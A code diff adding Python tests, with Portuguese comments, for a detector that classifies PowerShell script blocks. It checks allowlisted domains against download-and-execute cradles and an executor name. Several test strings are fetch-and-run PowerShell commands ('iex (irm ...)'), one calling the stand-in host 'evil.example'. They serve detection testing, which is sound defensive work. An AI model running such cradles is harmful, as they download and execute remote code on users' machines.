@@ -115,6 +115,50 @@ def test_scriptblock_benign_clean():
     assert we._classify_scriptblock("Get-ChildItem | Sort-Object Name") is None
 
 
+# TRUSTED_DOMAINS nasce vazio (popula de trusted_domains.json local); os testes
+# injetam um domínio sintético e limpam depois (herméticos).
+_TRUSTED_TEST_DOMAIN = "allowlisted.test"
+
+
+def _with_trusted(fn):
+    import database
+    database.TRUSTED_DOMAINS.add(_TRUSTED_TEST_DOMAIN)
+    try:
+        fn()
+    finally:
+        database.TRUSTED_DOMAINS.discard(_TRUSTED_TEST_DOMAIN)
+
+
+def test_scriptblock_trusted_domain_cradle_clean():
+    """FP: cradle (download+iex) de DOMÍNIO CONFIÁVEL (allowlist) é instalador
+    legítimo do dono (steamtools etc.) — NÃO flagga. Inclui o script grande
+    baixado em memória que só casa (b) por ter download e iex soltos."""
+    def check():
+        assert we._classify_scriptblock(
+            f'iex (irm "https://{_TRUSTED_TEST_DOMAIN}/install-plugin.ps1")') is None
+        assert we._classify_scriptblock(
+            "# its own non-fatal hiccups (temp-zip cleanup)\n"
+            f"$d = irm https://{_TRUSTED_TEST_DOMAIN}/x ; iex $d") is None
+    _with_trusted(check)
+
+
+def test_scriptblock_trusted_domain_does_not_clear_executor():
+    """Domínio confiável NÃO dá passe pra nome de executor real no mesmo script:
+    se cita 'solara', é evidência independente -> continua HIGH."""
+    def check():
+        res = we._classify_scriptblock(
+            f'iex (irm "https://{_TRUSTED_TEST_DOMAIN}/x.ps1"); Start-Process solara.exe')
+        assert res and res[0] == "high" and res[1] == "solara"
+    _with_trusted(check)
+
+
+def test_scriptblock_untrusted_cradle_still_high():
+    """Não pode regredir: cradle de domínio NÃO-confiável continua HIGH."""
+    res = we._classify_scriptblock('iex (irm "https://evil.example/x.ps1")')
+    assert res and res[0] == "high"
+    assert res[1] == "ps-scriptblock:download+iex"
+
+
 # ----------------------------- scanner (mockado) -----------------------------
 
 def _patch(monkeypatch, system=None, ps=None, security=None):
